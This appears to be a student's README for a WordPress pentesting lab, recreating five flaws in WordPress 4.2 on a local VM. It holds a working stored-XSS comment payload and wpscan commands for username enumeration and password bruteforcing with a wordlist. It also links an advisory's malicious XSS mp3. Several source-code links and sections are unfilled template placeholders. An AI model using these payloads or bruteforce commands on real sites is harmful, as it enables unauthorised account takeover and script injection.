# Project 7 - WordPress Pentesting

Time spent: 10 hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. (Required) Large File Upload Error XSS
  - [ ] Summary: 
    - Vulnerability types:XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: <img src="Large File Upload Error XSS.gif">
  - [ ] Steps to recreate: An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 2. (Required) Comment Cross-Site Scripting
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: <img src="Comment Cross-Site Scripting.gif">
  - [ ] Steps to recreate: Paste the following text in a comment: ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 kb]..AAA'></a>```
          Make sure the character length is 64kb or more.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 3. (Required) User Enumeration
  - [ ] Summary: 
    - Vulnerability types: User Enumeration
    - Tested in version: 4.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: <img src="User Enumeration.gif">
  - [ ] Steps to recreate: Paste the following code to kali-linux terminal: ```wpscan --url wpdistillery.vm --enumerate u```
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 4. (Optional) Password Bruteforce Attack
  - [ ] Summary: 
    - Vulnerability types: Password Bruteforce Attack
    - Tested in version: 4.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: <img src="Bruteforce Attack.gif">
  - [ ] Steps to recreate: 
          - Download the wordlist: ```apt-get install wordlists```
          -Extract the wordlist inside: ```/usr/share/wordlists/```
          -Paste the following code to kali-linux terminal: ```wpscan --url wpdistillery.vm --wordlist /usr/share/wordlists/rockyou.txt --username admin```

  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. (Optional) Authenticated Cross-Site Scripting (XSS) via Media File Metadata
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: <img src="Authenticated Cross-Site Scripting (XSS) via Media File Metadata.gif">
  - [ ] Steps to recreate: 
          -Download the .mp3 from ```https://www.securify.nl/advisory/SFY20160742/xss.mp3```
          -Upload this audio file to Media Library.
          -Create a post with this audio inside a playlist.

  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2020] [Guruprem Rajpal]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
